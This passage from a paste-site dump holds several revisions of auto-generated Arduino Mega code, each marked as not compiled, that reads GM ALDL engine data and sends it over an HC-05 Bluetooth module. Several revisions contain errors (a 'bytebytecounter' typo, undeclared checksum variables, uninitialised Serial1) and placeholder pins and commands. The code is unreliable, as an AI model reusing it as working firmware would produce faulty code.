            dataString += String(((DataBytes[45] * 256) + DataBytes[46]) * 0.015259);
            dataString += "", O2mv: "";
            dataString += String(DataBytes[17] * 4.44);
            dataString += "", MAT: "";
            dataString += String(T_interpolate(DataBytes[30]));
            dataString += "", Runtime: "";
            dataString += String(DataBytes[52] * 256 + DataBytes[53]);

            // Send data string over Bluetooth
            HC05.println(dataString);
        }
        // Optional: add delay or further processing
        delay(1000); // Send data every 1 second
    }
}

// T_interpolate function remains unchanged from the provided user code
float T_interpolate(byte DS_Temp)
{
    const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
    const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
    float T_Range;
    float T_Diff;
    float TempRange;
    float Temperature;
    int i = 0;
    while (i<38)
    {
        if  (TempScale[i]> DS_Temp) break;
        i++;
    }
    if (i>0)
    {
        T_Range = TempScale[i] - TempScale[i-1];
        T_Diff =  DS_Temp - TempScale[i-1];
        TempRange = TempValue[i] - TempValue[i-1];
        Temperature =  TempValue[i-1] + (T_Diff/T_Range)*TempRange;
    }
    else Temperature = TempValue[0];

    return Temperature;
}
"
bT4CmKiK,Vehicle Data rev_20,pleasedontcode,Arduino,Friday 11th of July 2025 05:30:16 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:29:37

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for T_interpolate function

/***** DEFINITION OF Software Serial *****/
// Bluetooth HC05 module pins
const uint8_t HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial HC05_BluetoothModule_HC05_mySerial(HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_RX_A1, HC05_BluetoothModule_HC05_mySerial_PIN_SERIAL_TX_A0);

// Define other pins and variables used in the code
const int ALDLTestPin = 2; // Example pin, define as per your hardware
const int DecodeDataOutputPin = 3; // Example pin, define as per your hardware
const int HexDataOutputPin = 4; // Example pin, define as per your hardware

byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, define as per your protocol
byte DataBytes[65]; // Buffer for data bytes
const int ByteCount = 64; // Total number of data bytes expected
int linecount = 16; // Number of bytes per line in hex output
int bytecounter = 0; // Counter for hex output formatting

// Variables for parsed data
unsigned long RPM;
float TPS;
float MAF;
byte BLCELL;
byte BLM;
byte INTEGRATOR;
float InjPW;
float O2mv;
float MAT;
unsigned long Runtime;

// Flags and timers
bool SilenceFound = false;
bool PreambleFound = false;
unsigned long PreambleTimer = 0;
byte ALDLbyte = 0;

// Preamble pattern
byte Preamble[3] = {0x80, 0x95, 0x01};

// Function prototypes
float T_interpolate(byte DS_Temp);

void setup(void)
{
  // put your setup code here, to run once:
  HC05_BluetoothModule_HC05_mySerial.begin(9600);
  // Initialize serial communication for debugging/output
  Serial.begin(115200);
  // Initialize serial1 at 8192 baud for ALDL data
  Serial1.begin(8192);
  delay(1500);
  Serial.println(""Ready for data capture"");
  // Initialize I/O pins
  pinMode(ALDLTestPin, INPUT);
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);
  pinMode(HexDataOutputPin, INPUT_PULLUP);
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false; // Reset silence flag
  unsigned long StartTime = micros(); // Start timer
  while ((micros() - StartTime) < 15000) { // Wait 15 ms silence
    if (digitalRead(ALDLTestPin) == 0) { // Any activity resets timer
      StartTime = micros();
    }
  }
  SilenceFound = true; // Silence detected

  while (SilenceFound == true) { // Loop while silence is detected
    PreambleFound = false; // Reset preamble flag
    // Send Mode 1 command
    Serial.print("" M1 cmd "");
    int i = 0;
    while (i < 4) {
      Serial1.write(M1Cmd[i]);
      i++;
    }
    Serial.println("" Finding Preamble  "");
    i = 0; // Reset index for preamble detection
    PreambleTimer = millis(); // Start timeout timer
    while ((millis() - PreambleTimer) < 100 && PreambleFound == false) {
      if (Serial1.available() > 0) {
        ALDLbyte = Serial1.read();
        if (ALDLbyte == Preamble[i]) {
          i++;
          if (i > 2) PreambleFound = true; // Preamble detected
        } else {
          PreambleFound = false;
          i = 0; // Reset if mismatch
        }
      }
    }
    if (PreambleFound) {
      // Read data bytes
      int DataStreamIndex = 1;
      while (DataStreamIndex < 65) {
        if (Serial1.available() > 0) {
          DataBytes[DataStreamIndex] = Serial1.read();
          DataStreamIndex++;
        }
      }
      // Calculate checksum
      int i = 1;
      unsigned long CheckTotal = 0x80 + 0x95 + 0x01; // Sum preamble bytes
      while (i < ByteCount) {
        CheckTotal += DataBytes[i];
        i++;
      }
      byte CheckSum = (byte)(0x200 - CheckTotal);
      // Verify checksum
      if (digitalRead(DecodeDataOutputPin) == LOW) {
        Serial.print(""New Data Stream received at "");
        Serial.print(millis());
        Serial.print("" Calc CHECKSUM: "");
        Serial.print(CheckSum, HEX);
        Serial.print("" Transmitted CHECKSUM: "");
        Serial.print(DataBytes[ByteCount], HEX);
        if (CheckSum == DataBytes[ByteCount]) {
          Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
        } else {
          Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
        }
        // Parse data bytes
        RPM = DataBytes[11] * 25; // Engine RPM
        TPS = DataBytes[10] * 0.019608; // TPS volts
        MAF = ((DataBytes[36] * 256) + (DataBytes[37])) * 0.003906; // MAF gm/sec
        BLCELL = DataBytes[21];
        BLM = DataBytes[20];
        INTEGRATOR = DataBytes[22];
        InjPW = ((DataBytes[45] * 256) + (DataBytes[46])) * 0.015259;
        O2mv = DataBytes[17] * 4.44;
        MAT = T_interpolate(DataBytes[30]);
        Runtime = (DataBytes[52] * 256 + DataBytes[53]);

        // Send data over Bluetooth to Android
        HC05_BluetoothModule_HC05_mySerial.print(""RPM:"");
        HC05_BluetoothModule_HC05_mySerial.print(RPM);
        HC05_BluetoothModule_HC05_mySerial.print("",TPS:"");
        HC05_BluetoothModule_HC05_mySerial.print(TPS);
        HC05_BluetoothModule_HC05_mySerial.print("",MAF:"");
        HC05_BluetoothModule_HC05_mySerial.print(MAF);
        HC05_BluetoothModule_HC05_mySerial.print("",BLCELL:"");
        HC05_BluetoothModule_HC05_mySerial.print(BLCELL);
        HC05_BluetoothModule_HC05_mySerial.print("",BLM:"");
        HC05_BluetoothModule_HC05_mySerial.print(BLM);
        HC05_BluetoothModule_HC05_mySerial.print("",INTEGRATOR:"");
        HC05_BluetoothModule_HC05_mySerial.print(INTEGRATOR);
        HC05_BluetoothModule_HC05_mySerial.print("",InjPW:"");
        HC05_BluetoothModule_HC05_mySerial.print(InjPW);
        HC05_BluetoothModule_HC05_mySerial.print("",O2mv:"");
        HC05_BluetoothModule_HC05_mySerial.print(O2mv);
        HC05_BluetoothModule_HC05_mySerial.print("",MAT:"");
        HC05_BluetoothModule_HC05_mySerial.print(MAT);
        HC05_BluetoothModule_HC05_mySerial.print("",Runtime:"");
        HC05_BluetoothModule_HC05_mySerial.println(Runtime);

        // Display parsed data
        Serial.print(""Engine Speed     : "");
        Serial.print(RPM);
        Serial.println("" RPM"");
        Serial.print(""Throttle Position: "");
        Serial.print(TPS);
        Serial.println("" Volts"");
        Serial.print(""Mass Air Flow    : "");
        Serial.print(MAF);
        Serial.println("" Grams/Sec"");
        Serial.print(""Current BLM Cell: "");
        Serial.print(BLCELL);
        Serial.print("" BLM Value: "");
        Serial.print(BLM);
        Serial.print(""  Current Fuel Integrator: "");
        Serial.println(INTEGRATOR);
        Serial.print(""Injector Pulse   : "");
        Serial.print(InjPW);
        Serial.println("" Milliseconds"");
        Serial.print(""O2 Sensor Voltage: "");
        Serial.print(O2mv);
        Serial.println("" Millivolts"");
        Serial.print(""Intake Air Temp  : "");
        Serial.print(MAT);
        Serial.println("" Deg C"");
        Serial.print(""Engine Run Time  : "");
        Serial.print(Runtime);
        Serial.println("" Seconds"");
        // Delay for readability
        unsigned long StartTimeDelay = millis();
        while (millis() - StartTimeDelay < 3000) {
          if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // Flush buffer
        }
      } else if (digitalRead(HexDataOutputPin) == LOW) {
        // Send hex data
        Serial.print(""New Data Stream received at "");
        Serial.print(millis());
        Serial.print("" Calc CHECKSUM: "");
        Serial.print(CheckSum, HEX);
        Serial.print("" Transmitted CHECKSUM: "");
        Serial.print(DataBytes[ByteCount], HEX);
        if (CheckSum == DataBytes[ByteCount]) {
          Serial.println("" Checksum GOOD - Data as follows: "");
        } else {
          Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
        }
        int j = 1;
        bytebytecounter = 0;
        while (j < ByteCount + 1) {
          Serial.print(DataBytes[j], HEX);
          j++;
          bytecounter++;
          if (bytecounter >= linecount) {
            bytecounter = 0;
            Serial.println();
          } else {
            Serial.print("" "");
          }
        }
        Serial.println();
      } else {
        // Send raw data
        Serial.write(0x80);
        Serial.write(0x95);
        Serial.write(0x01);
        for (int j = 1; j < ByteCount + 1; j++) {
          Serial.write(DataBytes[j]);
        }
      }
    }
  }
}

// Implementation of T_interpolate function
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
5TmBP8YL,Vehicle Data rev_19,pleasedontcode,Arduino,Friday 11th of July 2025 05:26:18 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:25:37

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Added prototype for the interpolation function

/***** DEFINITION OF Software Serial *****/
const uint8_t HC05_Bluetooth_TX_PIN = A0; // Bluetooth TX pin
const uint8_t HC05_Bluetooth_RX_PIN = A1; // Bluetooth RX pin
SoftwareSerial HC05(HC05_Bluetooth_TX_PIN, HC05_Bluetooth_RX_PIN);

// Define other variables used in the code
// Assuming these are declared globally as in the original code
// For example:
int ALDLTestPin = 2; // Example pin, replace with actual
int DecodeDataOutputPin = 3; // Example pin, replace with actual
int HexDataOutputPin = 4; // Example pin, replace with actual
byte M1Cmd[4] = {0x01, 0x02, 0x03, 0x04}; // Example command, replace with actual
byte Preamble[3] = {0x55, 0xAA, 0xFF}; // Example preamble
byte ALDLbyte;
int i, DataStreamIndex, ByteCount = 64; // Example value
byte DataBytes[65];
unsigned long PreambleTimer, StartTime, PreambleFound, SilenceFound, CommInit8192;
float RPM, TPS, MAF, BLCELL, BLM, INTEGRATOR, InjPW, O2mv, MAT, Runtime;
int linecount = 16; // Example for hex output line count
int bytecounter;

// Interpolation function
float T_interpolate(byte DS_Temp)
{
  const float TempScale[38] = {1, 5, 6, 9, 11, 15, 19, 25, 31, 38, 47, 57, 67, 79, 91, 104, 117, 130, 142, 154, 164, 175, 184, 192, 200, 206, 212, 217, 222, 226, 230, 233, 235, 238, 240, 242, 244, 256};
  const float TempValue[38] = {-40, -30, -25, -20, -15, -10, -5, 0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 200};
  float T_Range;
  float T_Diff;
  float TempRange;
  float Temperature;
  int i = 0;
  while (i < 38)
  {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0)
  {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  }
  else
  {
    Temperature = TempValue[0];
  }
  return Temperature;
}

void setup(void)
{
  // put your setup code here, to run once:
  HC05.begin(9600);
  Serial.begin(115200); // Initialize Serial for debugging and output
  // Initialize pins
  pinMode(ALDLTestPin, INPUT); // ALDL activity detection pin
  pinMode(DecodeDataOutputPin, INPUT_PULLUP); // Decoded data output control
  pinMode(HexDataOutputPin, INPUT_PULLUP); // Hex data output control

  // Initialize variables
  i = 0; // Reset preamble index
  PreambleFound = false;
  SilenceFound = false;
  CommInit8192 = false;
  StartTime = 0;
  PreambleTimer = 0;
  bytecounter = 0;
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false; // Reset silence flag
  unsigned long StartTimeMicros = micros(); // First look for an active signal or a timeout - initialize timer
  // Should exit this loop on the start of a bit
  while ((micros() - StartTimeMicros) < 15000) // Wait for a 15 ms silent period
  {
    if (digitalRead(ALDLTestPin) == 0) // Any line activity resets the start time
    {
      StartTimeMicros = micros(); // Timing starts over
    }
  }
  SilenceFound = true; // Set the silence flag on exit

  while (SilenceFound == true) // While silence found flag is set, continuously request and transmit Mode 1 data
  {
    PreambleFound = false; // Reset preamble found flag

    while (PreambleFound == false) // First look at data until the preamble has been found will read data forever until a preamble is read
    {
      // Send Mode 1 command
      Serial.print("" M1 cmd "");
      i = 0; // use bytecounter to send the outgoing Mode1CMD sequence
      while (i < 4)
      {
        Serial1.write(M1Cmd[i]); // sends 1 byte of the command sequence
        i++;
      }
      Serial.println("" Finding Preamble  "");
      i = 0; // Then reset byte counter and scan incoming data for the preamble
      PreambleTimer = millis(); // Initialize timer to detect timeout
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false))
      {
        if (Serial1.available() > 0)
        {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i])
          {
            i++; // Increment the preamble index
            if (i > 2) PreambleFound = true; // Preamble found
          }
          else
          {
            PreambleFound = false; // Reset preamble found flag
            i = 0; // Reset the preamble index
          }
        }
      }
    }
    // Read data stream
    DataStreamIndex = 1; // Start at index 1
    while (DataStreamIndex < 65) // Read 64 bytes (including checksum)
    {
      if (Serial1.available() > 0)
      {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }
    // Calculate checksum
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01; // Sum preamble bytes
    while (i < ByteCount)
    {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal; // Two's complement

    // Send data over Bluetooth to Android
    // For simplicity, send parsed data as a comma-separated string
    // Parse data
    RPM = DataBytes[11] * 25; // Engine RPM
    TPS = DataBytes[10] * 0.019608; // TPS volts
    MAF = ((DataBytes[36] * 256) + (DataBytes[37])) * 0.003906; // MAF gm/sec
    BLCELL = DataBytes[21];
    BLM = DataBytes[20];
    INTEGRATOR = DataBytes[22];
    InjPW = ((DataBytes[45] * 256) + (DataBytes[46])) * 0.015259;
    O2mv = DataBytes[17] * 4.44;
    MAT = T_interpolate(DataBytes[30]);
    Runtime = (DataBytes[52] * 256 + DataBytes[53]);

    // Prepare string to send over Bluetooth
    String dataString = """";
    dataString += ""RPM:"" + String(RPM) + "","";
    dataString += ""TPS:"" + String(TPS) + "","";
    dataString += ""MAF:"" + String(MAF) + "","";
    dataString += ""BLCELL:"" + String(BLCELL) + "","";
    dataString += ""BLM:"" + String(BLM) + "","";
    dataString += ""INTEGRATOR:"" + String(INTEGRATOR) + "","";
    dataString += ""InjPW:"" + String(InjPW) + "","";
    dataString += ""O2mv:"" + String(O2mv) + "","";
    dataString += ""MAT:"" + String(MAT) + "","";
    dataString += ""Runtime:"" + String(Runtime);

    // Send over Bluetooth
    HC05.println(dataString);

    // Existing code for checksum verification and output
    if (digitalRead(DecodeDataOutputPin) == LOW)
    {
      // Decoded data output
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
      {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      }
      else
      {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }
      // Parse data (already done above)
      // Print parsed data
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");
      // Delay for readability
      unsigned long StartTime = millis();
      while (millis() < StartTime + 3000)
      {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // Flush buffer
      }
    }
    else if (digitalRead(HexDataOutputPin) == LOW)
    {
      // Hex data output
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
      {
        Serial.println("" Checksum GOOD - Data as follows: "");
      }
      else
      {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }
      int j = 1;
      bytecounter = 0;
      while (j < ByteCount + 1)
      {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount)
        {
          bytecounter = 0;
          Serial.println();
        }
        else
        {
          Serial.print("" "");
        }
      }
      Serial.println();
    }
    else
    {
      // Raw binary stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j < ByteCount + 1; j++)
      {
        Serial.write(DataBytes[j]);
      }
    }
  }
}
"
DTbK1tBG,Vehicle Data rev_18,pleasedontcode,Arduino,Friday 11th of July 2025 05:20:35 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 22:19:51

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp);

/***** DEFINITION OF Software Serial *****/
// Define Bluetooth module pins
const uint8_t HC05_BluetoothModule_TX_PIN = A0; // Bluetooth TX pin connected to Arduino Mega A0
const uint8_t HC05_BluetoothModule_RX_PIN = A1; // Bluetooth RX pin connected to Arduino Mega A1

// Instantiate SoftwareSerial for Bluetooth communication
SoftwareSerial HC05(HC05_BluetoothModule_TX_PIN, HC05_BluetoothModule_RX_PIN); // Initialize SoftwareSerial for Bluetooth communication

// Define other pins used in the code (assuming they are declared elsewhere in your full code)
const uint8_t ALDLTestPin = 2; // Example pin, replace with actual pin if different
const uint8_t DecodeDataOutputPin = 3; // Example pin, replace with actual pin if different
const uint8_t HexDataOutputPin = 4; // Example pin, replace with actual pin if different

// Variables used in the code
bool SilenceFound = false;
unsigned long StartTime = 0;
bool PreambleFound = false;
unsigned long PreambleTimer = 0;
byte ALDLbyte = 0;
int DataStreamIndex = 1;
const int ByteCount = 64; // Total bytes in data stream
byte DataBytes[65]; // Data buffer
const byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble sequence
int i = 0;
int CheckTotal = 0;
int CheckSum = 0;
const int linecount = 16; // Number of bytes per line in hex output
int bytecounter = 0;

// Command sequence for Mode 1 request (assuming it's defined elsewhere)
const byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, replace with actual if different

// Variables for parsed data
int RPM = 0;
float TPS = 0.0;
float MAF = 0.0;
byte BLCELL = 0;
byte BLM = 0;
byte INTEGRATOR = 0;
float InjPW = 0.0;
float O2mv = 0.0;
float MAT = 0.0;
unsigned long Runtime = 0;

void setup() {
  // Configure I/O pins
  pinMode(ALDLTestPin, INPUT);
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);
  pinMode(HexDataOutputPin, INPUT_PULLUP);

  // Initialize serial communications
  Serial.begin(115200); // Serial monitor
  Serial1.begin(8192); // ALDL data serial at 8192 baud
  delay(1500);
  Serial.println(""Ready for data capture"");

  // Initialize Bluetooth serial
  HC05.begin(9600); // Bluetooth serial at 9600 baud

  // Initialize variables
  i = 0; // Reset preamble index
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false; // Reset silence flag
  StartTime = micros(); // Start timer

  // Wait for 15 ms of silence
  while ((micros() - StartTime) < 15000) {
    if (digitalRead(ALDLTestPin) == 0) {
      StartTime = micros(); // Reset timer if activity detected
    }
  }
  SilenceFound = true; // Silence detected

  while (SilenceFound == true) {
    // Continuously request and transmit Mode 1 data
    PreambleFound = false; // Reset preamble flag

    // Send Mode 1 command sequence
    Serial.print("" M1 cmd "");
    i = 0;
    while (i < 4) {
      Serial1.write(M1Cmd[i]);
      i++;
    }
    Serial.println("" Finding Preamble  "");
    i = 0;
    PreambleTimer = millis();

    // Search for preamble in incoming data
    while ((millis() - PreambleTimer) < 100 && PreambleFound == false) {
      if (Serial1.available() > 0) {
        ALDLbyte = Serial1.read();
        if (ALDLbyte == Preamble[i]) {
          i++;
          if (i > 2) PreambleFound = true;
        } else {
          PreambleFound = false;
          i = 0;
        }
      }
    }

    // Read data stream
    DataStreamIndex = 1;
    while (DataStreamIndex < 65) {
      if (Serial1.available() > 0) {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01; // sum preamble bytes
    while (i < ByteCount) {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal; // two's complement

    // Send data over Bluetooth and Serial based on output mode
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      // Send decoded data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }

      // Parse data
      RPM = DataBytes[11] * 25; // Engine RPM
      TPS = DataBytes[10] * 0.019608; // TPS volts
      MAF = ((DataBytes[36] * 256) + (DataBytes[37])) * 0.003906; // MAF gm/sec
      BLCELL = DataBytes[21];
      BLM = DataBytes[20];
      INTEGRATOR = DataBytes[22];
      InjPW = ((DataBytes[45] * 256) + (DataBytes[46])) * 0.015259;
      O2mv = DataBytes[17] * 4.44;
      MAT = T_interpolate(DataBytes[30]);
      Runtime = (DataBytes[52] * 256 + DataBytes[53]);

      // Output parsed data to Serial monitor
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Send parsed data over Bluetooth
      HC05.print(""Engine Speed: "");
      HC05.print(RPM);
      HC05.println("" RPM"");
      HC05.print(""Throttle Position: "");
      HC05.print(TPS);
      HC05.println("" V"");
      HC05.print(""Mass Air Flow: "");
      HC05.print(MAF);
      HC05.println("" g/sec"");
      HC05.print(""BLM Cell: "");
      HC05.print(BLCELL);
      HC05.print("" BLM: "");
      HC05.print(BLM);
      HC05.print("" Fuel Integrator: "");
      HC05.println(INTEGRATOR);
      HC05.print(""Injector Pulse: "");
      HC05.print(InjPW);
      HC05.println("" ms"");
      HC05.print(""O2 Voltage: "");
      HC05.print(O2mv);
      HC05.println("" mV"");
      HC05.print(""Intake Temp: "");
      HC05.print(MAT);
      HC05.println("" C"");
      HC05.print(""Runtime: "");
      HC05.print(Runtime);
      HC05.println("" sec"");

      // Delay for readability
      unsigned long StartTime = millis();
      while (millis() < StartTime + 3000) {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // flush buffer
      }
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Send hex data over Bluetooth and Serial
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }

      int j = 1;
      bytecounter = 0;
      while (j < ByteCount + 1) {
        Serial.print(DataBytes[j], HEX);
        HC05.print(DataBytes[j], HEX); // Send over Bluetooth
        j++;
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter = 0;
          Serial.println("""");
          HC05.println("""");
        } else {
          Serial.print("" "");
          HC05.print("" "");
        }
      }
      Serial.println("""");
      HC05.println("""");
    } else {
      // Send raw binary data over Serial and Bluetooth
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      HC05.write(0x80);
      HC05.write(0x95);
      HC05.write(0x01);
      for (int j = 1; j < ByteCount + 1; j++) {
        Serial.write(DataBytes[j]);
        HC05.write(DataBytes[j]);
      }
    }
  }
}

// Implementation of T_interpolate function from user code
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1, 5, 6, 9, 11, 15, 19, 25, 31, 38, 47, 57, 67, 79, 91, 104, 117, 130, 142, 154, 164, 175, 184, 192, 200, 206, 212, 217, 222, 226, 230, 233, 235, 238, 240, 242, 244, 256};
  const float TempValue[38] = {-40, -30, -25, -20, -15, -10, -5, 0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 200};
  float T_Range;
  float T_Diff;
  float TempRange;
  float Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
